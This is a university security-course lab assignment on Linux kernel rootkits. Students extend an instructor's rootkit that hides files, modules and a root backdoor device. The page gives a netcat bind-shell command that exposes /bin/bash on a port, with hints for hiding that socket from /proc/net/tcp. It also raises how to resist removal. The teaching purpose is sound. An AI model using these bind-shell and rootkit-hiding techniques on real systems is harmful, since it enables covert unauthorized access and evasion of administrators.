---
title: Kernel Backdoors and Rootkits
parent: System Security
nav_order: 2
summary: Rootkits
---

# Lab 9: Kernel Rootkits

This lab will introduce you to both kernel module programming and to kernel
backdoors and rootkits. You will take an existing kernel rootkit written by your instructor
and extend it.

~~Due Date: Monday 03/07/22 before class~~
**Due Date: Friday 03/11/22 11:59PM CST**

## Lab Description
This lab will guide you through kernel rootkit construction. More details are
in the code's repo and below, but here is the gist. The rootkit already is
written to:

- Hide our rootkit source and object files from the filesystem (`b4rnd00r.{c,ko}`)
- Hide our rootkit from the kernel's list of loaded modules (by scrubbing `/proc/modules`)
- Hide our parasite library from the previous lab, `libtest.so.1.0`, (by scrubbing `/proc/PID/maps`)
- Create a local backdoor to get us root by exposing a device file at
  `/dev/b4rn`. When a user writes a [special string](https://www.youtube.com/watch?v=7R0mD3uWk5c) to that file, the user will
  become root.
- Hiding the backdoor character device file (`/dev/b4rn`).

### Getting the Code
You'll want to use the SEED 16.04 Ubuntu VM for this lab. In the VM, you can
get the code for this lab by cloning your instructor's repo:

```bash
git clone https://github.com/khale/kernel-rootkit-poc
```
Make sure to go through the `README` in the repo. The SEED VM should have everything necessary to load the rootkit.


### Task 1: The code
Understand the code. You should realize that the kernel module's entry point
(`b4rn_init()`) is invoked after the module is loaded by the kernel (e.g., by
`insmod` or `modprobe`). Start there and read comments carefully.

### Task 2: The Backdoor

Could an attacker use the backdoor exposed by the rootkit to remotely get
access? Explain why or why not.

Realize that this is a pretty rudimentary backdoor. There are certainly more stealthy ways to do this (e.g., so we don't create an unwanted device file on the system). Can you think of any?

By the way, there have been [nefarious attempts](https://lwn.net/Articles/57135/) to backdoor the kernel itself,
though they were unsuccessful. This isn't limited by any means to kernel space.
The NSA is suspected to have [backdoored](https://miracl.com/blog/backdoors-in-nist-elliptic-curves/) a standard altorithm widely used for
encryption. Your instructor's [favorite example of a backdoor](https://www.win.tue.nl/~aeb/linux/hh/thompson/trust.html) was one injected
by a C compiler into the UNIX login program, devised by the [UNIX man himself](https://en.wikipedia.org/wiki/Ken_Thompson).
Definitely worth a read.


### Task 3: Hiding in Plain Sight

Explain why we must (1) use function pointers and `kallsyms_*()` functions to call certain routines and (2) manipulate `cr0` and page protections to install our function overrides.

Suppose I wanted to make it very hard for a system administrator to remove my rootkit from the system. What are some things I could do to prevent that? (Hint: there is a `reboot()` system call)

### Task 4: Remote Backdoor

For this task you'll be extending b4rnd00r to hide a remote backdoor (i.e.,
a bindshell running on the system). First run a bind shell like so:

```bash
nohup nc -nvlp 9474 -e /bin/bash >/dev/null 2>&1 &
```
(note, you may have to install `netcat-traditional` for this to work).

This listens on port 9474, and when a client connects it will spawn a shell and
send output back out over the network socket. The `nohup` command prevents the
netcat program from exiting after we log out of the system (which we would
probably do after we've owned a machine and set up the backdoor). The
redirection just silences output on the server side.

If you've got bridged networking set up for your VM, you should be able to
access this bind shell as follows from your **host** machine:

```bash
nc <VM-IP> 9474
```

You can access it with NAT networking as well, but you'll have to forward the
9474 port with your hypervisor. It's probably just easier to use bridged
networking. Other than the `nc` process itself, the listening socket can be seen
by an auditor pretty easily by using `netstat`:

```
$ netstat -tl
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State      
    tcp        0      0 cato:domain             0.0.0.0:*               LISTEN     
    tcp        0      0 localhost:ipp           0.0.0.0:*               LISTEN     
    tcp        0      0 0.0.0.0:9474            0.0.0.0:*               LISTEN     
    tcp6       0      0 localhost:ipp           [::]:*                  LISTEN     
    tcp6       0      0 [::]:9474               [::]:*                  LISTEN
```


This is no good if we're trying to be stealthy. We can pretty much guess that
this information is coming from the kernel, and almost certainly from `/proc`
somewhere, and that `netstat` is really just sugar coating the kernel's output.
We can do some digging to find out exactly where:

```
 $ strace netstat -tl 2>&1 | grep "^open" | grep "proc"
    openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY) = 3
    openat(AT_FDCWD, "/proc/net/tcp6", O_RDONLY) = 3
```

Sure enough, `netstat` is really just a wrapper around the `/proc` interface. Let's
see the raw information straight from the source (the kernel):

```
$ cat /proc/net/tcp
     sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
       0: 017AA8C0:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 34934 1 000000007060ba94 100 0 0 10 0 
       1: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 30174 1 00000000d07a82df 100 0 0 10 0
       2: 00000000:2502 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 59441 1 000000003a4d11ec 100 0 0 10 0
```

You can see why `netstat` exists now. This output is pretty opaque. If we
realize that 9474 is actually 0x2502, however, we can pretty easily identify
our bind shell. This gives us a hint on how to hide our connection then,
because we really just need to scrub this output to remove that line in our
rootkit. This is your task!

Some hints:
- You should be able to use the same `seq_file` technique used for the maps file.
- Network sockets are also exposed in `/proc`. You will focus on TCP (IPv4). You will thus need to take a look at `/proc/net/tcp` (or `/proc/self/net/tcp`).
- You'll want to see the `tcp4_seq_show()` [function](https://elixir.bootlin.com/linux/v4.8/source/net/ipv4/tcp_ipv4.c#L2257).
- When you override the seq file, you will need to use the `struct inet_sock` [structure](https://elixir.bootlin.com/linux/v4.8/source/include/net/sock.h#L306) (which you can derive from the `v` pointer in your seq handler). Given a `struct sock * sk`, you will need to extract the port number from the socket structure like so: `ntohs(inet_sk(sk)->inet_sport)`.
- You don't need to use `unprotect_page()` and `protect_page()` like was done for the maps file.
- Make sure not to dereference the special start socket (if `v==SEQ_START_TOKEN`, just pass it along to the normal seq function).

<!--
- The proc dirs for `/proc/net` are organized in a red black tree. See [here](https://lwn.net/Articles/184495/) and understand the `init_net` struct from the `net/tcp.h` [header](https://elixir.bootlin.com/linux/v4.8/source/include/net/tcp.h) and its `proc_net` member field. You will want to use [helper functions](https://elixir.bootlin.com/linux/v4.8/source/include/linux/rbtree.h#L69) provided by Linux like `rb_first()`, `rb_last()`, `rb_entry()`, `struct proc_dir_entry` etc.
--> 

## Handin
Please write your lab report according to the description. Please also list the
important code snippets followed by your explanation. You will not receive
credit if you simply attach code without any explanation. Upload your answers
as a PDF to blackboard


## Suggested Reading
- Intro to [Linux kernel modules](https://tldp.org/HOWTO/Module-HOWTO/x73.html)
- Linux VFS, proc, and root filesystems [article](https://harryskon.wordpress.com/2015/03/31/vfs-proc-and-root-filesystems/)
- Kernel documentation on [seq files](https://www.kernel.org/doc/Documentation/filesystems/seq_file.txt)
- Another [rootkit example](https://0x00sec.org/t/hiding-with-a-linux-rootkit/4532)
- [Article](https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9) on bind shells, reverse
shells, etc.
- [Sysdig](https://github.com/draios/sysdig)
- [Looking back at Multics security](https://hack.org/mc/texts/classic-multics.pdf)

